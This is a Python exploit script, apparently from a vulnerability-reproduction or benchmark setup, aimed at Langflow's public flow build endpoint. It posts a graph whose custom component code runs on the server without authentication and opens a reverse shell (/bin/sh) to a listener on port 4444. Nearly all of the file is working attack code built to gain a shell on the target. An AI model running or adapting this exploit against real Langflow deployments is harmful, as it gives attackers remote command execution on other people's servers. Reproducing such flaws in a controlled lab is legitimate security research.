#!/usr/bin/env python3
"""Run a shell through a public Langflow build with attacker supplied graph data."""

import json
import os
import time
import urllib.error
import urllib.request
import uuid


PUBLIC_FLOW_ID = "e8b4f8c2-7a1d-4e5f-9b3c-2a6d8f0e1b4a"


def wait_for_public_flow(target_url: str) -> None:
    flow_url = target_url.rstrip("/") + "/api/v1/flows/public_flow/" + PUBLIC_FLOW_ID
    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        try:
            with urllib.request.urlopen(flow_url, timeout=10) as response:
                flow = json.load(response)
            if flow.get("id") == PUBLIC_FLOW_ID and flow.get("access_type") == "PUBLIC":
                return
        except urllib.error.HTTPError as error:
            if error.code not in {403, 404}:
                raise
        time.sleep(2)
    raise RuntimeError("The seeded public flow was not ready")


def make_graph() -> dict:
    shell_code = (
        "import socket,subprocess;"
        "connection=socket.create_connection(('127.0.0.1',4444));"
        "subprocess.call(['/bin/sh','-i'],stdin=connection,"
        "stdout=connection,stderr=connection)"
    )
    code = (
        "from langflow.custom import Component\n\n"
        "shell = __import__('subprocess').Popen([__import__('sys').executable,'-c',"
        + repr(shell_code)
        + "])\n\n"
        "class Pwn(Component):\n"
        "    display_name = 'Pwn'\n"
        "    def build(self) -> None:\n"
        "        pass\n"
    )
    node = {
        "id": "CustomComponent-pwn",
        "type": "genericNode",
        "data": {
            "id": "CustomComponent-pwn",
            "type": "CustomComponent",
            "node": {
                "template": {
                    "code": {"type": "str", "value": code},
                    "_type": "CustomComponent",
                },
                "base_classes": ["CustomComponent"],
                "display_name": "Custom Component",
                "outputs": [{"types": ["CustomComponent"], "name": "Custom Component"}],
            },
        },
    }
    return {"nodes": [node], "edges": []}


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    wait_for_public_flow(target_url)
    url = target_url.rstrip("/") + "/api/v1/build_public_tmp/" + PUBLIC_FLOW_ID + "/flow"
    request = urllib.request.Request(
        url,
        data=json.dumps({"data": make_graph()}).encode("utf-8"),
        headers={
            "Content-Type": "application/json",
            "Cookie": "client_id=" + uuid.uuid4().hex,
        },
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=60) as response:
        result = json.load(response)
    if not result.get("job_id"):
        raise RuntimeError("Public flow build did not create a job")
    print(json.dumps({"evidence_payload": {}}))


if __name__ == "__main__":
    main()
